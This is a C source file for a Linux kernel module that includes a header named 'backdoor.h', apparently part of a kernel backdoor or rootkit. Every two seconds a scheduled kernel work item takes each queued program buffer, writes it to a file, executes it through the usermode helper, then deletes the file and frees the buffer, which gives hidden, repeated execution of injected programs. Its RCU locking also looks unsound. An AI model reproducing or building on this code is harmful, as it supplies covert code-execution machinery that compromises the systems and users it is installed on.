#include <linux/rculist.h>
#include <linux/workqueue.h>
#include "backdoor.h"

DEFINE_SPINLOCK(listmutex);

program_list *head;
extern unsigned char *buffer;
extern unsigned long buffer_length;

void execute_ready_programs(void){
	program_list *entry;

	rcu_read_lock();
	list_for_each_entry_rcu(entry, &(head->prog_list), prog_list){
		buffer = entry->buffer;
		buffer_length = entry->length;

		create_file();

		/*
		 * UMH calls schedule which creates a warning if
		 * it is inside an rcu read lock, so we unlock it.
		 */
		rcu_read_unlock();
		execute_file(); 
		rcu_read_lock();

		destroy_file();

		if (entry->buffer){
			kfree(entry->buffer);
			entry->length = 0;
		}

		spin_lock(&listmutex);
		list_del_rcu(&(entry->prog_list));
		spin_unlock(&listmutex);
	}
	rcu_read_unlock();
}

void add_program(program_list **head, program_list *entry){
	spin_lock(&listmutex);
	list_add_tail_rcu(&(entry->prog_list), &((*head)->prog_list));
	spin_unlock(&listmutex);
}

program_list *init_program(int flag){
	program_list *head = kmalloc(sizeof(struct program_list), flag);
	memset(head, 0, sizeof(struct program_list));	
	INIT_LIST_HEAD(&(head->prog_list));
	return head;
}

void init_prog_list(void){
	head = init_program(GFP_KERNEL);
}

/* https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/check.c#L145 */
static void work_func(struct work_struct *dummy);
static DECLARE_DELAYED_WORK(work, work_func);

static void work_func(struct work_struct *dummy){
	execute_ready_programs();
	schedule_delayed_work(&work,
		round_jiffies_relative(2*HZ));
}

void init_del_workqueue(void){
	schedule_delayed_work(&work, 0);
}

void exit_del_workqueue(void){
	cancel_delayed_work_sync(&work);
}
